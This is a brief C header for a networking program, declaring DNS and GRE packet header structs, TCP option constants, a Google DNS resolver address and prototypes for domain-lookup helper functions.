#pragma once

#include "includes.h"

#define RESOLV_DNS_SERVER INET_ADDR(8, 8, 8, 8)

struct dnshdr {
  uint16_t id, opts, qdcount, ancount, nscount, arcount;
};

struct dns_question {
  uint16_t qtype, qclass;
};

struct dns_resource {
  uint16_t type, _class;
  uint32_t ttl;
  uint16_t data_len;
} __attribute__((packed));

struct grehdr {
  uint16_t opts, protocol;
};

#define PROTO_DNS_QTYPE_A 1
#define PROTO_DNS_QCLASS_IP 1

#define PROTO_TCP_OPT_NOP 1
#define PROTO_TCP_OPT_MSS 2
#define PROTO_TCP_OPT_WSS 3
#define PROTO_TCP_OPT_SACK 4
#define PROTO_TCP_OPT_TSVAL 8

#define PROTO_GRE_TRANS_ETH 0x6558

struct resolv_entries {
  uint8_t addrs_len;
  uint32_t *addrs;
};

void resolv_domain_to_hostname(char *, char *);
struct resolv_entries *resolv_lookup(char *);
void resolv_entries_free(struct resolv_entries *);
